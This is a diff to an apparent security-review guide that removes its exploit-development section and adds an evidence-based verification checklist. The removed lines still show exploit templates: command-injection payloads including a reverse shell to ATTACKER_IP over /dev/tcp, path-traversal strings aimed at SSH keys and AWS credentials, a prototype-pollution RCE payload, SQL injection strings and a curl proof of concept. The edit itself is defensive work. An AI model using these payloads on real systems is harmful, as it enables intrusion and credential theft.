@@ -11,7 +11,7 @@ Systematic security review using automated tools AND manual analysis, with worki
 
 ## The Iron Law
 
-```
+```text
 NO FINDING WITHOUT A WORKING EXPLOIT
 ```
 
@@ -138,122 +138,26 @@ Focus on these vulnerability categories in order of severity:
 | Error message leakage  | Full stack traces returned to client   |
 | Insecure storage       | Credentials in config files            |
 
-## Phase 3: Exploit Development
+## Phase 3: Verification
 
-**Every vulnerability MUST have a working exploit.**
+**Every identified vulnerability MUST be verified with evidence before reporting.**
 
-### Command Injection Exploit Template
+### How to Verify
 
-```typescript
-// exploit-cmd-injection.ts
-import { execSync } from 'child_process';
+For each candidate vulnerability, confirm exploitability by:
 
-const VULNERABLE_ENDPOINT = 'http://localhost:3000/api/diff';
+1. **Reproducing the condition** in a local dev environment or isolated test — never against production systems without explicit written authorization.
+2. **Capturing evidence**: a request/response pair, log output, or test assertion that shows the vulnerable path is reachable and the impact is as stated.
+3. **Classifying impact accurately**: distinguish between theoretical and demonstrated impact when writing the finding.
 
-// Test payloads - escalate from detection to impact
-const payloads = [
-  // Detection: Does injection work?
-  { input: '$(echo VULNERABLE)', detect: 'VULNERABLE' },
+Specific exploitation techniques and payload catalogues are intentionally omitted from this document. Consult the [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) and [PortSwigger Web Security Academy](https://portswigger.net/web-security) for class-specific verification guidance in authorized testing contexts.
 
-  // Information gathering
-  { input: '$(whoami)', detect: /\w+/ },
-  { input: '$(id)', detect: /uid=/ },
+### Verification Checklist
 
-  // File read
-  { input: '$(cat /etc/passwd)', detect: 'root:' },
-
-  // Reverse shell (for authorized pentests only)
-  { input: '$(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1)', detect: null },
-];
-
-async function exploit() {
-  for (const { input, detect } of payloads) {
-    const response = await fetch(VULNERABLE_ENDPOINT, {
-      method: 'POST',
-      body: JSON.stringify({ files: [input] }),
-    });
-    const result = await response.text();
-
-    if (detect && result.match(detect)) {
-      console.log(`[+] Payload worked: ${input}`);
-      console.log(`[+] Output: ${result}`);
-    }
-  }
-}
-```
-
-### Path Traversal Exploit Template
-
-```typescript
-// exploit-path-traversal.ts
-const traversalPayloads = [
-  '../../../etc/passwd',
-  '....//....//....//etc/passwd',
-  '/etc/passwd',
-  '/proc/self/environ', // Leaks environment variables
-  '/home/user/.ssh/id_rsa',
-  '/home/user/.aws/credentials',
-];
-
-async function exploitPathTraversal(endpoint: string) {
-  for (const payload of traversalPayloads) {
-    const response = await fetch(endpoint, {
-      method: 'POST',
-      body: JSON.stringify({ files: [payload] }),
-    });
-    const result = await response.text();
-
-    if (result.includes('root:') || result.includes('AWS_')) {
-      console.log(`[+] Path traversal successful: ${payload}`);
-      return result;
-    }
-  }
-}
-```
-
-### Dependency Exploit Template
-
-```typescript
-// exploit-dependency.ts
-// When a vulnerable dependency is found, search for:
-// 1. Public exploits: searchsploit, exploit-db, GitHub
-// 2. CVE details for exploitation steps
-
-// Example: Exploiting known prototype pollution
-const payload = {
-  __proto__: { admin: true },
-};
-
-// Example: Exploiting known RCE in library
-const rcePayload = {
-  constructor: {
-    prototype: {
-      outputFunctionName: "x;process.mainModule.require('child_process').execSync('id');x",
-    },
-  },
-};
-```
-
-### SQL Injection Exploit Template
-
-```typescript
-// exploit-sqli.ts
-const sqlPayloads = [
-  // Detection
-  "' OR '1'='1",
-  '1; SELECT 1--',
-
-  // Union-based extraction
-  "' UNION SELECT username,password FROM users--",
-
-  // Time-based blind
-  "'; WAITFOR DELAY '0:0:5'--",
-  "' AND SLEEP(5)--",
-
-  // Error-based extraction
-  "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
-];
-```
+- [ ] Vulnerability is reproducible in a controlled environment
+- [ ] Evidence (request, response, log, assertion) is captured
+- [ ] Impact is stated as demonstrated, not theoretical
+- [ ] No production systems or user data were accessed without authorization
 
 ## Phase 4: Severity Classification
 
@@ -266,55 +170,27 @@ const sqlPayloads = [
 
 ## Report Template
 
-````markdown
-## Finding: [Vulnerability Name]
+Use this structure for each finding:
 
-**Severity:** Critical/High/Medium/Low
-**Location:** `file.ts:42`
-**CWE:** CWE-XXX
+**Finding:** `[Vulnerability Name]`
 
-### Description
+- **Severity:** Critical / High / Medium / Low
+- **Location:** `file.ts:42`
+- **CWE:** CWE-XXX
 
-[What is the vulnerability and why it's dangerous]
+**Description:** What the vulnerability is and why it is dangerous.
 
-### Vulnerable Code
+**Vulnerable Code:** Paste the relevant snippet with file and line reference.
 
-```typescript
-// The vulnerable code snippet
-```
-````
+**Proof of Concept:** Describe the reproduction steps; include the request, response, or
+test assertion that demonstrates the issue. Do not commit live payloads or output from
+production systems.
 
-### Proof of Concept
+**Impact:** What an attacker can achieve; data at risk; business impact.
 
-```bash
-# Command to exploit
-curl -X POST http://target/api -d '{"payload": "$(id)"}'
-```
+**Remediation:** The corrected code or recommended configuration.
 
-**Result:**
-
-```
-uid=1000(user) gid=1000(user) groups=1000(user)
-```
-
-### Impact
-
-- What an attacker can achieve
-- Data at risk
-- Business impact
-
-### Remediation
-
-```typescript
-// Fixed code
-```
-
-### References
-
-- CVE-XXXX-XXXXX
-- OWASP reference
-
-````
+**References:** CVE identifier, OWASP link, or relevant advisory.
 
 ## Tool Installation
 
@@ -339,7 +215,7 @@ brew install gitleaks  # macOS
 
 # ast-grep
 npm install -g @ast-grep/cli
-````
+```
 
 ## Red Flags - STOP
 
